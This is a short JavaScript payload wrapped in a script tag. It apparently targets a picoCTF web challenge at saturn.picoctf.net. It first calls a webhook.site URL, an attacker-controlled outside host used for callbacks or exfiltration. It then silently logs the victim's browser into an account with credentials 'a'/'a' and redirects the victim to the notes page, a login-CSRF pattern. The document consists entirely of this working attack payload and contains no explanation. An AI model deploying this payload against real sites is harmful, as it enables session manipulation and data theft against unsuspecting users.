<script>
fetch('https://webhook.site/43011d10-0e2d-4e21-99e0-ec5c8b43e9fd/2');

fetch("http://saturn.picoctf.net:57376/login", {
    method: "POST",
    headers: {
        "Content-Type": "application/json",
    },
    body: JSON.stringify({
        username: "a",
        password: "a"
    })
}).then(() => {
    window.location.href = "http://saturn.picoctf.net:57376/notes";
});
</script>
